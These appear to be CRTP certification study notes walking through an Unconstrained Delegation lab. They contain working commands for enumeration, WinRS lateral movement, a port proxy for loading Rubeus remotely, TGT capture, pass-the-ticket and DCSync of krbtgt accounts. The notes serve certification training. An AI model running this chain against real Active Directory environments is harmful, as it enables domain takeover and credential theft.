# Learning Objective 15 – Unconstrained Delegation

## Overview

This section focuses on abusing **Unconstrained Kerberos Delegation** in the `dcorp` Active Directory environment.

The objective is to identify a server with Unconstrained Delegation enabled, compromise it, obtain privileged Kerberos tickets, and use those tickets to escalate privileges.

---

# 1. Learning Objectives

The objectives of this section are:

* Find a server in the `dcorp` domain where **Unconstrained Delegation** is enabled.
* Compromise the server and escalate to **Domain Admin** privileges.
* Escalate to **Enterprise Admins** privileges by abusing the **Printer Bug**.
* Additionally, abuse Unconstrained Delegation using **MS-WSP** and **MS-DFSNM**.

---

# 2. Find Unconstrained Delegation

PowerView can be used to identify computers configured for Unconstrained Delegation.

### 🔴 Command

```powershell
Get-DomainComputer -UnConstrained | Select -ExpandProperty samaccountname
```

### Purpose

This enumerates computers in the domain where **Unconstrained Delegation** is enabled and displays their `samAccountName`.

Example concept:

```text
Domain
 │
 ├── dcorp-appsrv
 ├── dcorp-adminsrv
 ├── dcorp-dc
 └── ...
        │
        ▼
Unconstrained Delegation
        │
        ▼
dcorp-appsrv
```

The server identified from this enumeration becomes an important target for the lab.

---

# 3. Start a Process as AppAdmin

The material then requires starting a process using the `appadmin` account.

The purpose is to work from the security context of the compromised/application account.

The exact command for starting the process is not provided in the supplied material, so it is intentionally not added here.

---

# 4. Check Local Administrator Access

Before attempting remote access, check whether the current account has local administrator privileges on domain machines.

### 🔴 Command

```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

### Purpose

This helps identify machines where the current account has local administrative access through PowerShell Remoting.

Conceptually:

```text
Current Account
      │
      ▼
Find machines with
local administrator access
      │
      ▼
Potential remote target
```

---

# 5. Run Rubeus in Monitor Mode

Rubeus is used to monitor for Kerberos tickets.

### 🔴 Command

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```

In the lab, the monitoring process is later configured to target a specific machine account.

### Targeted Monitoring

```cmd
Rubeus.exe monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
```

### Important

The `$` indicates a **computer account**.

For example:

```text
dcorp-dc$
```

is the computer account associated with the domain controller.

---

# 6. Copy Loader to the Target

The material demonstrates copying `Loader.exe` to the target server.

### 🔴 Command

```cmd
echo F | xcopy Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

### Breakdown

| Component           | Meaning                               |
| ------------------- | ------------------------------------- |
| `echo F`            | Supplies the file response to `xcopy` |
| `xcopy`             | Copies the file                       |
| `Loader.exe`        | Source file                           |
| `\\dcorp-appsrv\C$` | Administrative share on target        |
| `/Y`                | Suppresses overwrite confirmation     |

The file is copied to:

```text
C:\Users\Public\Loader.exe
```

on `dcorp-appsrv`.

---

# 7. Connect to the Target Using WinRS

The material then uses **Windows Remote Shell**.

### 🔴 Command

```cmd
winrs -r:dcorp-appsrv cmd
```

### Purpose

This establishes a remote command shell on:

```text
dcorp-appsrv
```

`WinRS` uses Windows Remote Management (WinRM).

Conceptually:

```text
Student VM
    │
    │ WinRM
    ▼
dcorp-appsrv
    │
    └── cmd.exe
```

Commands entered after obtaining the remote shell execute on the target machine.

---

# 8. Port Proxy

The material uses Windows `netsh` to create a port proxy.

### 🔴 Command

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGET>
```

### Purpose

This creates a local IPv4-to-IPv4 port forwarding rule.

Conceptually:

```text
Port 8080
    │
    ▼
Port Proxy
    │
    ▼
Target: Port 80
```

This is used in the lab to make a resource available through the configured local port.

---

# 9. Loader – Execute Rubeus

The material uses `Loader.exe` to load Rubeus.

### 🔴 Command

```cmd
Loader.exe -path http://127.0.0.1:8080/rubeus.exe -args monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
```

### Breakdown

| Component                          | Purpose                                 |
| ---------------------------------- | --------------------------------------- |
| `Loader.exe`                       | Loader used in the lab                  |
| `-path`                            | Specifies the Rubeus location           |
| `http://127.0.0.1:8080/rubeus.exe` | Rubeus location                         |
| `-args`                            | Arguments passed to Rubeus              |
| `monitor`                          | Starts ticket monitoring                |
| `/targetuser:dcorp-dc$`            | Monitors the specified computer account |
| `/interval:5`                      | Five-second interval                    |
| `/nowrap`                          | Prevents output wrapping                |

---

# 10. Obtain the TGT

The monitoring process waits for the target computer account to authenticate.

The objective is to obtain the **TGT (Ticket Granting Ticket)** associated with the target.

Conceptually:

```text
Rubeus Monitor
      │
      ▼
Monitor dcorp-dc$
      │
      ▼
Kerberos authentication
      │
      ▼
TGT appears
      │
      ▼
Copy TGT
```

The obtained ticket is then used in the next stage.

---

# 11. Form an Elevated Shell

The material then forms an elevated shell before performing ticket operations.

The exact command used to create the elevated shell is not included in the supplied text, so no additional command is assumed here.

The important concept is:

```text
Current Shell
     │
     ▼
Elevated Shell
     │
     ▼
Ticket Operations
```

---

# 12. Pass-the-Ticket

The obtained TGT can be injected into the current session using Rubeus.

### 🔴 Command

```cmd
Loader.exe -path Rubeus.exe -args ptt /ticket:<PASTE_TICKET>
```

### Breakdown

| Component          | Meaning                                |
| ------------------ | -------------------------------------- |
| `Loader.exe`       | Lab loader                             |
| `-path Rubeus.exe` | Loads Rubeus                           |
| `ptt`              | Pass-the-Ticket                        |
| `/ticket:`         | Specifies the obtained Kerberos ticket |

Conceptually:

```text
Obtained TGT
     │
     ▼
Rubeus PTT
     │
     ▼
Current Session
     │
     ▼
Authentication using ticket
```

---

# 13. Check Available Kerberos Tickets

After injecting the ticket, Windows can be queried to check the tickets available in the current session.

### 🔴 Command

```cmd
klist
```

### Purpose

`klist` displays Kerberos tickets currently available in the logon session.

Example concept:

```text
klist
 │
 ├── TGT
 ├── Service Tickets
 └── Other Kerberos Tickets
```

This helps verify that the ticket injection was successful.

---

# 14. DCSync – dcorp

The material then demonstrates DCSync against the `krbtgt` account.

### 🔴 Command

```cmd
Loader.exe -path Rubeus.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

### Purpose

The command demonstrates a DCSync operation targeting:

```text
dcorp\krbtgt
```

The `krbtgt` account is a highly sensitive account in the Kerberos infrastructure of the domain.

---

# 15. Monitoring Another Domain Controller

The material then demonstrates monitoring another computer account:

```text
mcorp-dc$
```

### 🔴 Command

```cmd
Rubeus.exe monitor /targetuser:mcorp-dc$ /interval:5 /nowrap
```

### Purpose

This monitors for Kerberos tickets associated with the specified computer account.

The `$` again identifies the account as a **computer account**.

---

# 16. Pass-the-Ticket – Second Stage

After obtaining the required ticket, it can be injected using Rubeus.

### 🔴 Command

```cmd
Loader.exe -path Rubeus.exe -args ptt /ticket:<PASTE_TICKET>
```

The same Pass-the-Ticket technique is used with the newly obtained ticket.

---

# 17. DCSync – mcorp

The material finally demonstrates DCSync against the `krbtgt` account in the `mcorp` context.

### 🔴 Command

```cmd
Loader.exe -path Rubeus.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

### Important Parameters

| Parameter                 | Meaning                          |
| ------------------------- | -------------------------------- |
| `/user:mcorp\krbtgt`      | Target account                   |
| `/domain:moneycorp.local` | Specifies the domain             |
| `lsadump::evasive-dcsync` | DCSync operation used in the lab |

---

# 18. Complete Lab Attack Chain

The complete flow from the supplied material can be summarized as:

```text
             DOMAIN ENUMERATION
                     │
                     ▼
       Find Unconstrained Delegation
                     │
                     ▼
              dcorp-appsrv
                     │
                     ▼
        Check Local Admin Access
                     │
                     ▼
             Remote Access
                     │
                     ▼
          Run Rubeus Monitor
                     │
                     ▼
        Monitor dcorp-dc$
                     │
                     ▼
             Obtain TGT
                     │
                     ▼
            Pass-the-Ticket
                     │
                     ▼
                klist
                     │
                     ▼
               DCSync
                     │
                     ▼
             dcorp\krbtgt
```

---

# 19. Enterprise Admin Escalation

The learning objective also mentions escalation to **Enterprise Admins** using the **Printer Bug**.

The high-level concept is:

```text
Domain Admin
     │
     ▼
Printer Bug / Authentication Coercion
     │
     ▼
Privileged Machine Authentication
     │
     ▼
Kerberos Ticket
     │
     ▼
Pass-the-Ticket
     │
     ▼
Enterprise Admin
```

The supplied material does not provide the specific Printer Bug command, so it is not included here.

---

# 20. MS-WSP and MS-DFSNM

The learning objective additionally mentions abusing Unconstrained Delegation using:

* **MS-WSP**
* **MS-DFSNM**

These are additional Windows protocols/services that can be relevant to authentication coercion in an Active Directory environment.

The supplied material does not provide the specific commands for these techniques, so they are recorded here as objectives rather than adding commands that were not present in the source material.

---

# 21. Command Cheat Sheet

## 🔎 Unconstrained Delegation

```powershell
Get-DomainComputer -UnConstrained | Select -ExpandProperty samaccountname
```

---

## 🔎 Local Administrator Access

```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

---

## 👀 Rubeus Monitoring

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```

### Targeted Monitoring

```cmd
Rubeus.exe monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
```

---

## 📁 Copy Loader

```cmd
echo F | xcopy Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

---

## 💻 WinRS

```cmd
winrs -r:dcorp-appsrv cmd
```

---

## 🔀 Port Proxy

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGET>
```

---

## ▶️ Load Rubeus

```cmd
Loader.exe -path http://127.0.0.1:8080/rubeus.exe -args monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
```

---

## 🎫 Pass-the-Ticket

```cmd
Loader.exe -path Rubeus.exe -args ptt /ticket:<PASTE_TICKET>
```

---

## 🎫 Check Tickets

```cmd
klist
```

---

## 🗄️ DCSync – dcorp

```cmd
Loader.exe -path Rubeus.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

## 👀 Monitor mcorp-dc$

```cmd
Rubeus.exe monitor /targetuser:mcorp-dc$ /interval:5 /nowrap
```

---

## 🎫 Pass-the-Ticket – Second Stage

```cmd
Loader.exe -path Rubeus.exe -args ptt /ticket:<PASTE_TICKET>
```

---

## 🗄️ DCSync – mcorp

```cmd
Loader.exe -path Rubeus.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

---

# 22. Quick Revision

### Step 1 – Find Delegation

```powershell
Get-DomainComputer -UnConstrained | Select -ExpandProperty samaccountname
```

### Step 2 – Check Access

```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

### Step 3 – Access Target

```cmd
winrs -r:dcorp-appsrv cmd
```

### Step 4 – Monitor

```cmd
Rubeus.exe monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
```

### Step 5 – Obtain TGT

```text
Wait for / trigger the relevant authentication in the lab
```

### Step 6 – Inject Ticket

```cmd
Loader.exe -path Rubeus.exe -args ptt /ticket:<PASTE_TICKET>
```

### Step 7 – Verify

```cmd
klist
```

### Step 8 – DCSync

```cmd
Loader.exe -path Rubeus.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

# 23. CRTP Memory Map

```text
UNCONSTRAINED DELEGATION
          │
          ▼
 Find delegated server
          │
          ▼
 Check local admin access
          │
          ▼
     Remote access
          │
          ▼
   Rubeus monitoring
          │
          ▼
     Obtain TGT
          │
          ▼
   Pass-the-Ticket
          │
          ▼
        klist
          │
          ▼
       DCSync
          │
          ▼
    Domain privileges
          │
          ▼
 Printer Bug / additional
 authentication coercion
          │
          ▼
 Enterprise Admin objective
```

---

# 24. Key Takeaways

* **Unconstrained Delegation** is the starting point of this lab objective.
* `Get-DomainComputer -UnConstrained` identifies computers configured for it.
* `Find-PSRemotingLocalAdminAccess` helps identify where the current account has administrative access.
* **WinRS** provides remote command-line access through WinRM.
* **Rubeus** is used to monitor and interact with Kerberos tickets.
* A computer account ending in `$` represents a **machine account**.
* **Pass-the-Ticket** allows an obtained Kerberos ticket to be injected into a session.
* `klist` can be used to inspect Kerberos tickets in the current session.
* **DCSync** is used in the lab to request credential material associated with the target account.
* The learning objective also covers **Printer Bug**, **MS-WSP**, and **MS-DFSNM** as additional delegation/coercion concepts.
* The central attack path is:

```text
Enumeration
    ↓
Unconstrained Delegation
    ↓
Server Access
    ↓
Kerberos Monitoring
    ↓
TGT
    ↓
Pass-the-Ticket
    ↓
DCSync
    ↓
Domain / Enterprise Privilege Escalation
```

> **CRTP Study Tip:** Don't memorize this as a list of commands. Memorize the relationship between **Unconstrained Delegation → privileged authentication → TGT → Pass-the-Ticket → privileged access → DCSync**. Once you understand that chain, the individual commands become much easier to remember.
